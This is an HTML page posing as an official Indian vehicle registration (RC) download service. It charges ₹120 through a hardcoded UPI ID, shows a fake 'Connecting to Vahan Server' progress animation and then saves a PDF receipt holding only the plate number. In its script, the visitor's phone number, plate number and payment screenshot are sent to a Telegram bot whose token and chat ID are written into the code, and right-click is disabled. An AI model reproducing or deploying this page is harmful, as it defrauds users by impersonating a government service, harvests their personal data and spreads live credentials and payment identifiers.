<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Official Digital RC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        body { background: #000; color: #fff; overflow-x: hidden; }

        /* Header */
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
        .logo { color: var(--primary); font-weight: 900; font-size: 22px; }

        /* Card */
        .card { margin: 110px auto 20px; width: 92%; max-width: 400px; background: #1a1a1c; padding: 30px 20px; border-radius: 25px; text-align: center; border: 1px solid #333; }

        /* HSRP PLATE - FIXED CENTER PLACEHOLDER */
        .hsrp-plate { 
            background: #fff; width: 100%; height: 70px; 
            border: 2px solid #555; border-radius: 12px; 
            display: flex; align-items: center; overflow: hidden; margin-bottom: 10px; 
        }
        .ind-strip { 
            background: var(--ind-blue); width: 65px; height: 100%; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; 
            flex-shrink: 0; border-right: 1px solid #ccc;
        }
        .ind-strip img { width: 26px; margin-bottom: 2px; }
        .ind-strip span { font-size: 15px; font-weight: 900; letter-spacing: 1px; }

        #vehInput { 
            flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; 
            text-align: center; color: #000; outline: none; letter-spacing: 1px;
            background: transparent; width: 100%;
        }
        /* Placeholder centering fix */
        #vehInput::placeholder { color: #aaa; text-align: center; opacity: 0.6; }

        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 0 #b30047; }
        
        /* Loader */
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; }
        .road { width: 85%; height: 4px; background: #333; position: relative; }
        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); transition: 0.1s linear; }
        .pct { font-size: 40px; font-weight: 900; color: var(--primary); margin-top: 25px; }

        .history-box { width: 92%; max-width: 400px; margin: 10px auto 100px; background: #111; padding: 15px; border-radius: 15px; border: 1px solid #333; text-align: center; }
        .h-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; font-size: 14px; border-left: 4px solid var(--primary); }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="header">
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
    </div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:20px;">Download RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
                    <span>IND</span>
                </div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <button class="btn" onclick="go2()">Continue</button>
        </div>

        <div id="p2" style="display:none;">
            <p style="margin-bottom:10px;">Pay ₹120 to Download PDF</p>
            <div style="background:#fff; padding:10px; border-radius:12px; display:inline-block; margin-bottom:15px;">
                <img id="qrImg" src="" width="190">
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10" style="width:100%; padding:15px; border-radius:10px; border:none; margin-bottom:10px; background:#222; color:#fff;">
            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px; color:#aaa;">
            <button class="btn" onclick="submit()">Verify & Download</button>
        </div>
    </div>

    <div class="history-box">
        <h3 style="font-size:15px; margin-bottom:10px; color:var(--primary);">Recent Records</h3>
        <div id="histContent"><p style="font-size:12px; color:#444;">No history.</p></div>
    </div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
        <p style="color:#666;">Connecting to Vahan Server...</p>
    </div>

    <script>
        window.onload = loadHistory;

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function go2() {
            if(document.getElementById('vehInput').value.length < 9) { alert("Invalid Vehicle Number"); return; }
            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
            document.getElementById('qrImg').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
            document.getElementById('p1').style.display='none';
            document.getElementById('p2').style.display='block';
        }

        function submit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            if(m.length < 10 || !s) { alert("Details missing!"); return; }

            document.getElementById('load').style.display='flex';
            let p = 0;
            let timer = setInterval(() => {
                p += 2;
                document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.88) + "%";
                if(p >= 100) {
                    clearInterval(timer);
                    saveLog(document.getElementById('vehInput').value);
                    makePDF();
                    sendTele(s);
                }
            }, 50);
        }

        function saveLog(v) {
            let logs = JSON.parse(localStorage.getItem('rc_history') || "[]");
            logs.unshift({v: v, d: new Date().toLocaleDateString()});
            localStorage.setItem('rc_history', JSON.stringify(logs.slice(0, 5)));
        }

        function loadHistory() {
            let logs = JSON.parse(localStorage.getItem('rc_history') || "[]");
            if(logs.length > 0) {
                document.getElementById('histContent').innerHTML = logs.map(item => `
                    <div class="h-item"><b>${item.v}</b> <span>${item.d}</span></div>
                `).join('');
            }
        }

        function makePDF() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const v = document.getElementById('vehInput').value;
            doc.setFillColor(255, 0, 102); doc.rect(0, 0, 210, 20, 'F');
            doc.setTextColor(255); doc.text("RCPDF.IN RECEIPT", 105, 13, null, null, "center");
            doc.setTextColor(0); doc.text(`Vehicle No: ${v}`, 20, 40);
            doc.text(`Status: Paid (Rs.120)`, 20, 50);
            doc.save(`RCPDF_${v}.pdf`);
            location.reload();
        }

        function sendTele(f) {
            let fd = new FormData();
            fd.append("chat_id", "5600045707");
            fd.append("photo", f);
            let msg = `🚀 NEW RC ORDER\n\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}\n\nRC DOWNLOAD`;
            fd.append("caption", msg);
            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd});
        }
    </script>
</body>
</html>
